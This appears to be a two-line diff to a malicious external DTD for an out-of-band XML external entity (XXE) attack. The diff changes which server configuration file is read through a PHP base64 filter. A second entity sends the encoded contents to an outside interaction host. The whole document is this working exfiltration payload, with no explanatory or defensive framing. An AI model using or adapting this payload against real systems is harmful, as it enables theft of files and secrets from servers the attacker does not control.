@@ -1,2 +1,2 @@
-<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=file:///etc/httpd/conf/default.conf">
+<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=file:///home/admin/httpd/conf/default.conf">
 <!ENTITY % inception "<!ENTITY exfil SYSTEM 'https://yxbzthesqwtqlzsjuqzxflkn4olz7mnkx.oast.fun/data?%data;'>">
